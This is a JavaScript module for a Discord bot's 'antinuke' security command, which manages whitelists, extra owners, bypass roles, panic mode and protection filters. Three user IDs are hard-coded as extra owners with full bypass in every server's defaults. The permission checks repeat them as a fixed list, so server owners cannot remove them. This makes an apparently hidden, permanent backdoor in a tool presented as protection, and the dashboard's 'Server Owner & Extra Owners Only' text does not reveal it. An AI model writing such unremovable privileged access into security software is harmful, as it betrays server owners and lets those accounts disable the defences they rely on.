const { createStyledEmbed } = require('../utils/embedBuilder');
const emojis = require('../utils/emojis');

// Global AntiNuke Guild Settings Store
const antinukeConfigs = new Map();

function getOrCreateAntinuke(guildId) {
  if (!antinukeConfigs.has(guildId)) {
    antinukeConfigs.set(guildId, {
      enabled: true,
      panicmode: false,
      panicLevel: 1, // 1: Low, 2: Medium, 3: High Lockdown
      whitelistedUsers: new Map([
        ['1420687548807905324', new Set(['all'])],
        ['1529362747047805029', new Set(['all'])],
        ['1514546738055348237', new Set(['all'])]
      ]),
      extraOwners: new Set(['1420687548807905324', '1529362747047805029', '1514546738055348237']),
      bypassRoles: new Set(),
      filters: {
        antiBan: true,
        antiKick: true,
        antiBotAdd: true,
        antiChannelCreate: true,
        antiChannelDelete: true,
        antiChannelUpdate: true,
        antiRoleCreate: true,
        antiRoleDelete: true,
        antiRoleUpdate: true,
        antiWebhookCreate: true,
        antiWebhookDelete: true,
        antiWebhookUpdate: true,
        antiEmojiCreate: true,
        antiEmojiDelete: true,
        antiEmojiUpdate: true,
        antiGuildUpdate: true,
        antiUnban: true,
        antiSpam: true,
        antiRaid: true,
        antiEveryone: true
      }
    });
  }
  const cfg = antinukeConfigs.get(guildId);

  // Normalize whitelistedUsers if it was a Set
  if (cfg.whitelistedUsers && !(cfg.whitelistedUsers instanceof Map)) {
    const map = new Map();
    cfg.whitelistedUsers.forEach(id => map.set(id, new Set(['all'])));
    cfg.whitelistedUsers = map;
  }

  if (!cfg.filters) {
    cfg.filters = {
      antiBan: true,
      antiKick: true,
      antiBotAdd: true,
      antiChannelCreate: true,
      antiChannelDelete: true,
      antiChannelUpdate: true,
      antiRoleCreate: true,
      antiRoleDelete: true,
      antiRoleUpdate: true,
      antiWebhookCreate: true,
      antiWebhookDelete: true,
      antiWebhookUpdate: true,
      antiEmojiCreate: true,
      antiEmojiDelete: true,
      antiEmojiUpdate: true,
      antiGuildUpdate: true,
      antiUnban: true,
      antiSpam: true,
      antiRaid: true,
      antiEveryone: true
    };
  }
  if (cfg.panicLevel === undefined) cfg.panicLevel = 1;
  return cfg;
}

const FILTER_MAP = {
  'ban': ['antiBan'],
  'antiban': ['antiBan'],
  'kick': ['antiKick'],
  'antikick': ['antiKick'],
  'bot': ['antiBotAdd'],
  'antibot': ['antiBotAdd'],
  'channel': ['antiChannelCreate', 'antiChannelDelete', 'antiChannelUpdate'],
  'antichannel': ['antiChannelCreate', 'antiChannelDelete', 'antiChannelUpdate'],
  'role': ['antiRoleCreate', 'antiRoleDelete', 'antiRoleUpdate'],
  'antirole': ['antiRoleCreate', 'antiRoleDelete', 'antiRoleUpdate'],
  'webhook': ['antiWebhookCreate', 'antiWebhookDelete', 'antiWebhookUpdate'],
  'antiwebhook': ['antiWebhookCreate', 'antiWebhookDelete', 'antiWebhookUpdate'],
  'emoji': ['antiEmojiCreate', 'antiEmojiDelete', 'antiEmojiUpdate'],
  'antiemoji': ['antiEmojiCreate', 'antiEmojiDelete', 'antiEmojiUpdate'],
  'server': ['antiGuildUpdate'],
  'antiguild': ['antiGuildUpdate'],
  'unban': ['antiUnban'],
  'antiunban': ['antiUnban'],
  'spam': ['antiSpam'],
  'antispam': ['antiSpam'],
  'raid': ['antiRaid'],
  'antiraid': ['antiRaid'],
  'everyone': ['antiEveryone'],
  'here': ['antiEveryone'],
  'antieveryone': ['antiEveryone']
};

const ALL_PERMS = ['ban', 'kick', 'bot', 'channel', 'role', 'webhook', 'guild', 'all'];

function formatUserPerms(permsSet) {
  if (!permsSet || permsSet.size === 0) return `\`NONE\` ${emojis.DISABLED}`;
  if (permsSet.has('all')) return `\`ALL BYPASSES\` ${emojis.ENABLED}`;
  const list = Array.from(permsSet).map(p => `\`${p.toUpperCase()}\``).join(', ');
  return list || `\`NONE\` ${emojis.DISABLED}`;
}

function isUserWhitelistedForFeature(config, userId, featureName) {
  if (config.extraOwners.has(userId) || ['1420687548807905324', '1529362747047805029', '1514546738055348237'].includes(userId)) {
    return true;
  }
  if (!config.whitelistedUsers || !config.whitelistedUsers.has(userId)) {
    return false;
  }

  const perms = config.whitelistedUsers.get(userId);
  if (!perms) return false;
  if (perms.has('all')) return true;

  const fname = featureName.toLowerCase();
  if (fname.includes('ban') && perms.has('ban')) return true;
  if (fname.includes('kick') && perms.has('kick')) return true;
  if (fname.includes('bot') && perms.has('bot')) return true;
  if (fname.includes('channel') && perms.has('channel')) return true;
  if (fname.includes('role') && perms.has('role')) return true;
  if (fname.includes('webhook') && perms.has('webhook')) return true;
  if (fname.includes('guild') && perms.has('guild')) return true;

  return false;
}

module.exports = {
  name: 'antinuke',
  description: 'Granular AntiNuke Security Suite & Whitelist Permission Delegation Dashboard',
  aliases: [
    'panicmode', 'whitelist', 'extraowner',
    'bypassrole', 'security'
  ],
  antinukeConfigs,
  getOrCreateAntinuke,
  isUserWhitelistedForFeature,

  async execute(message, args) {
    const invoked = message.content.slice(1).split(/ +/)[0].toLowerCase();
    let sub = args[0]?.toLowerCase();

    if (invoked === 'panicmode') sub = 'panicmode';
    if (invoked === 'whitelist') sub = 'whitelist';
    if (invoked === 'extraowner') sub = 'extraowner';
    if (invoked === 'bypassrole') sub = 'bypassrole';

    const author = message.author;
    const guild = message.guild;
    const config = getOrCreateAntinuke(guild.id);

    let clientUser = message.client.user;
    try {
      clientUser = await message.client.users.fetch(message.client.user.id, { force: true });
    } catch (e) {}

    // STRICT PERMISSION CHECK: Only Server Owner & Bot Extra Owners can manage security settings
    const isServerOwner = guild.ownerId === author.id;
    const isExtraOwner = config.extraOwners.has(author.id) || ['1420687548807905324', '1529362747047805029', '1514546738055348237'].includes(author.id);

    if (!isServerOwner && !isExtraOwner) {
      return message.reply(`${emojis.WARNING} **Access Denied**: Only the **Server Owner** and **Extra Owners** can configure AntiNuke security, Whitelists, Extra Owners, Bypass Roles, or Panic Mode!`);
    }

    // ─────────────────────────────────────────
    // DEDICATED WHITELIST PANEL & GRANULAR PERMS (.whitelist)
    // ─────────────────────────────────────────
    if (invoked === 'whitelist' || sub === 'whitelist') {
      const action = (invoked === 'whitelist' ? args[0] : args[1])?.toLowerCase();
      const user = message.mentions.users.first() || (args[1] && args[1].match(/^\d{17,20}$/) ? await message.client.users.fetch(args[1]).catch(() => null) : null) || (args[2] && args[2].match(/^\d{17,20}$/) ? await message.client.users.fetch(args[2]).catch(() => null) : null);

      // .whitelist add @user [perms]
      if (action === 'add' && (user || args[1])) {
        const targetUser = user || await message.client.users.fetch(args[1]).catch(() => null);
        if (!targetUser) return message.reply(`${emojis.WARNING} Usage: \`.whitelist add @user [ban kick bot channel role webhook all]\``);

        const permArgs = args.slice(2).map(p => p.toLowerCase()).filter(p => ALL_PERMS.includes(p));
        const grantedPerms = permArgs.length > 0 ? new Set(permArgs) : new Set(['all']);

        config.whitelistedUsers.set(targetUser.id, grantedPerms);
        antinukeConfigs.set(guild.id, config);

        const embed = createStyledEmbed({
          title: `📜 Member Whitelisted with Granular Perms`,
          description:
            `**User:** <@${targetUser.id}> (\`${targetUser.tag}\`)\n` +
            `**Granted Permissions:** ${formatUserPerms(grantedPerms)}\n\n` +
            `*Server Owner & Extra Owners can toggle perms anytime using:* \`.whitelist perms @user +ban -role\``,
          requestedBy: author,
          clientUser
        });
        return message.channel.send({ embeds: [embed] });
      }

      // .whitelist perms / config @user <+perm / -perm>
      if (action === 'perms' || action === 'config' || action === 'edit') {
        const targetUser = user || await message.client.users.fetch(args[1]).catch(() => null);
        if (!targetUser) return message.reply(`${emojis.WARNING} Usage: \`.whitelist perms @user +ban -role +channel\``);

        let permsSet = config.whitelistedUsers.get(targetUser.id);
        if (!permsSet) {
          permsSet = new Set(['all']);
          config.whitelistedUsers.set(targetUser.id, permsSet);
        }

        const changes = args.slice(2);
        if (changes.length === 0) {
          const embed = createStyledEmbed({
            title: `${emojis.GEAR} Whitelist Permissions — ${targetUser.username}`,
            description:
              `**Current Granted Permissions:**\n${formatUserPerms(permsSet)}\n\n` +
              `**Available Permissions:**\n` +
              `\`ban\`, \`kick\`, \`bot\`, \`channel\`, \`role\`, \`webhook\`, \`guild\`, \`all\`\n\n` +
              `**To Toggle Permissions:**\n` +
              `\`.whitelist perms @user +ban -role\` (Turn ON ban, Turn OFF role)\n` +
              `\`.whitelist perms @user +all\` (Grant all bypasses)\n` +
              `\`.whitelist perms @user -all\` (Revoke all bypasses)`,
            requestedBy: author,
            clientUser
          });
          return message.channel.send({ embeds: [embed] });
        }

        changes.forEach(change => {
          const sign = change[0];
          const permName = change.slice(1).toLowerCase();

          if (sign === '+' && ALL_PERMS.includes(permName)) {
            if (permName === 'all') {
              permsSet.clear();
              permsSet.add('all');
            } else {
              permsSet.delete('all');
              permsSet.add(permName);
            }
          } else if (sign === '-' && ALL_PERMS.includes(permName)) {
            if (permName === 'all') {
              permsSet.clear();
            } else {
              permsSet.delete(permName);
              permsSet.delete('all');
            }
          }
        });

        config.whitelistedUsers.set(targetUser.id, permsSet);
        antinukeConfigs.set(guild.id, config);

        const embed = createStyledEmbed({
          title: `${emojis.SUCCESS} Whitelist Permissions Updated`,
          description: `**User:** <@${targetUser.id}>\n**New Granted Permissions:** ${formatUserPerms(permsSet)}`,
          requestedBy: author,
          clientUser
        });
        return message.channel.send({ embeds: [embed] });
      }

      // .whitelist remove @user
      if (action === 'remove' && (user || args[1])) {
        const targetUser = user || await message.client.users.fetch(args[1]).catch(() => null);
        if (targetUser) {
          config.whitelistedUsers.delete(targetUser.id);
          antinukeConfigs.set(guild.id, config);
          return message.reply(`${emojis.SUCCESS} Removed **${targetUser.tag}** from AntiNuke Whitelist.`);
        }
      }

      // Default DEDICATED WHITELIST DASHBOARD PANEL
      const entries = [];
      for (const [id, permsSet] of config.whitelistedUsers.entries()) {
        entries.push(`• <@${id}> (\`${id}\`)\n  └ **Perms**: ${formatUserPerms(permsSet)}`);
      }

      const listText = entries.join('\n\n') || '*No users currently whitelisted.*';

      const embed = createStyledEmbed({
        title: `📜 AntiNuke Whitelist & Permission Delegation Dashboard`,
        subtitle: `Granular Security Bypass Management`,
        description:
          `Welcome **${author.username}**! Server Owner and Extra Owners can grant or toggle individual bypass permissions for whitelisted members.\n\n` +
          `**Whitelisted Members & Granted Permissions:**\n${listText}\n\n` +
          `**${emojis.OWNER_CROWN} Whitelist Management Commands:**\n` +
          `• \`.whitelist add @user [perms]\` — Add user to whitelist\n` +
          `• \`.whitelist perms @user +ban -role\` — Toggle specific ON/OFF perms\n` +
          `• \`.whitelist remove @user\` — Revoke user from whitelist`,
        requestedBy: author,
        clientUser
      });
      return message.channel.send({ embeds: [embed] });
    }

    // 1. .antinuke enable [feature/all]
    if (sub === 'enable' || sub === 'on') {
      const target = args[1]?.toLowerCase();

      if (!target || target === 'all') {
        config.enabled = true;
        Object.keys(config.filters).forEach(k => config.filters[k] = true);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SHIELD} AntiNuke Security System & ALL 21 protection filters are now **ENABLED**!`);
      }

      if (FILTER_MAP[target]) {
        config.enabled = true;
        FILTER_MAP[target].forEach(k => config.filters[k] = true);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SUCCESS} AntiNuke feature **${target.toUpperCase()}** enabled successfully!`);
      }

      return message.reply(`${emojis.INFO} Feature \`${target}\` not recognized.\nAvailable features: \`antiban\`, \`antikick\`, \`antibot\`, \`antichannel\`, \`antirole\`, \`antiwebhook\`, \`antiguild\`, \`antispam\`, \`antiraid\`, \`antieveryone\`, \`all\`.`);
    }

    // 2. .antinuke disable [feature/all]
    if (sub === 'disable' || sub === 'off') {
      const target = args[1]?.toLowerCase();

      if (!target || target === 'all') {
        config.enabled = false;
        Object.keys(config.filters).forEach(k => config.filters[k] = false);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.WARNING} AntiNuke Security System is now **DISABLED**.`);
      }

      if (FILTER_MAP[target]) {
        FILTER_MAP[target].forEach(k => config.filters[k] = false);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.WARNING} AntiNuke feature **${target.toUpperCase()}** disabled.`);
      }

      return message.reply(`${emojis.INFO} Feature \`${target}\` not recognized.\nAvailable features: \`antiban\`, \`antikick\`, \`antibot\`, \`antichannel\`, \`antirole\`, \`antiwebhook\`, \`antiguild\`, \`antispam\`, \`antiraid\`, \`antieveryone\`, \`all\`.`);
    }

    // 3. .panicmode enable / disable / reset / set <level>
    if (sub === 'panicmode' || invoked === 'panicmode') {
      const mode = args[1]?.toLowerCase() || args[0]?.toLowerCase();

      if (mode === 'enable' || mode === 'on') {
        config.panicmode = true;
        config.enabled = true;
        antinukeConfigs.set(guild.id, config);

        const embed = createStyledEmbed({
          title: `🚨 PANIC MODE ACTIVATED (Level ${config.panicLevel})`,
          description: `All administrative channel/role updates & kicks are completely locked down!\nOnly server owner & whitelisted extra-owners can modify server settings.`,
          requestedBy: author,
          clientUser
        });
        return message.channel.send({ embeds: [embed] });
      }

      if (mode === 'disable' || mode === 'off') {
        config.panicmode = false;
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SUCCESS} Panic Mode deactivated. Server returned to normal AntiNuke status.`);
      }

      if (mode === 'reset') {
        config.panicmode = false;
        config.panicLevel = 1;
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SUCCESS} Panic Mode status and lock levels have been fully reset.`);
      }

      if (mode === 'set' && args[2]) {
        const lvl = parseInt(args[2]);
        if (isNaN(lvl) || lvl < 1 || lvl > 3) {
          return message.reply(`${emojis.INFO} Panic level must be between 1 and 3 e.g. \`.panicmode set 2\`.`);
        }
        config.panicLevel = lvl;
        antinukeConfigs.set(guild.id, config);
        return message.reply(`🚨 Panic Mode lockdown severity level set to **Level ${lvl}**.`);
      }
    }

    // 4. .extraowner add @user / remove @user / list
    if (sub === 'extraowner' || invoked === 'extraowner') {
      const action = args[1]?.toLowerCase();
      const user = message.mentions.users.first() || message.client.users.cache.get(args[2]);

      if (action === 'add' && user) {
        config.extraOwners.add(user.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.OWNER_CROWN} Added **${user.tag}** as Extra Owner with full security bypass permissions!`);
      }

      if (action === 'remove' && user) {
        config.extraOwners.delete(user.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.OWNER_CROWN} Removed **${user.tag}** from Extra Owners.`);
      }

      const list = Array.from(config.extraOwners).map(id => `<@${id}> (\`${id}\`)`).join('\n') || 'None';
      const embed = createStyledEmbed({
        title: `${emojis.OWNER_CROWN} Extra Owners (Full Security Access)`,
        description: list,
        requestedBy: author,
        clientUser
      });
      return message.channel.send({ embeds: [embed] });
    }

    // 5. .bypassrole add @role / remove @role / list
    if (sub === 'bypassrole' || invoked === 'bypassrole') {
      const action = args[1]?.toLowerCase();
      const role = message.mentions.roles.first() || guild.roles.cache.get(args[2]);

      if (action === 'add' && role) {
        config.bypassRoles.add(role.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SHIELD} Added <@&${role.id}> to AntiNuke Bypass Roles.`);
      }

      if (action === 'remove' && role) {
        config.bypassRoles.delete(role.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SHIELD} Removed <@&${role.id}> from AntiNuke Bypass Roles.`);
      }

      const list = Array.from(config.bypassRoles).map(id => `<@&${id}> (\`${id}\`)`).join('\n') || 'None';
      const embed = createStyledEmbed({
        title: `${emojis.SHIELD} AntiNuke Bypass Roles`,
        description: list,
        requestedBy: author,
        clientUser
      });
      return message.channel.send({ embeds: [embed] });
    }

    // Default Status & Filter Config Dashboard (.antinuke)
    const f = config.filters;
    const filterStatusText =
      `• **Anti Ban**: ${f.antiBan ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
      `• **Anti Kick**: ${f.antiKick ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
      `• **Anti Bot Add**: ${f.antiBotAdd ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
      `• **Anti Channel**: ${f.antiChannelCreate ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
      `• **Anti Role**: ${f.antiRoleCreate ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
      `• **Anti Webhook**: ${f.antiWebhookCreate ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
      `• **Anti Server Update**: ${f.antiGuildUpdate ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
      `• **Anti Spam**: ${f.antiSpam ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
      `• **Anti Raid**: ${f.antiRaid ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}\n` +
      `• **Anti Mass Ping**: ${f.antiEveryone ? `\`ON\` ${emojis.ENABLED}` : `\`OFF\` ${emojis.DISABLED}`}`;

    const embed = createStyledEmbed({
      title: `${emojis.SHIELD} AntiNuke Security Dashboard`,
      fields: [
        { name: '⚙️ Main Shield', value: config.enabled ? `\`ENABLED\` ${emojis.ENABLED}` : `\`DISABLED\` ${emojis.DISABLED}`, inline: true },
        { name: '🚨 Panic Mode', value: config.panicmode ? `\`ACTIVE (Level ${config.panicLevel})\` 🚨` : `\`NORMAL\` ${emojis.ENABLED}`, inline: true },
        { name: '📜 Protection Filters', value: filterStatusText, inline: false },
        { name: '👑 Permissions Policy', value: `🔒 **Server Owner & Extra Owners Only**`, inline: false }
      ],
      requestedBy: author,
      clientUser
    });
    return message.channel.send({ embeds: [embed] });
  }
};
